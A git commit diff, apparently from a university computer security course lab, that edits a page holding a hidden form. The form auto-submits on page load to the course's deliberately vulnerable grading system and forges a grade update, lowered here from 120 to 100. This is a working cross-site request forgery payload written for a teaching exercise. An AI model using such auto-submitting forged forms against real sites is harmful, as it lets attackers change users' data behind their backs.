5ec961819679ec83302d58abce2e3e9103673613
Sebastian Liu <sebsadface@gmail.com>
2024-05-10 19:27:50 -0700

    update panda.php

--- lab2/panda.php
+++ lab2/panda.php
@@ -1,13 +1,10 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="f" action="https://cse484.cs.washington.edu/lab2/supersecuregradingsystem/?action=update-grade" method="post" class="form-signin" role="form">
-        <div style="width: 50%; margin: auto; padding-top: 5px">
+    <form id="f" action="https://cse484.cs.washington.edu/lab2/supersecuregradingsystem/?action=update-grade" method="post">
             <input name="groups" value="tjsl">
-            <input name="grade"  value="120">
-        </div>
+            <input name="grade"  value="100">
     </form>
-
     <script>
         window.onload = function() {
             document.getElementById('f').submit();
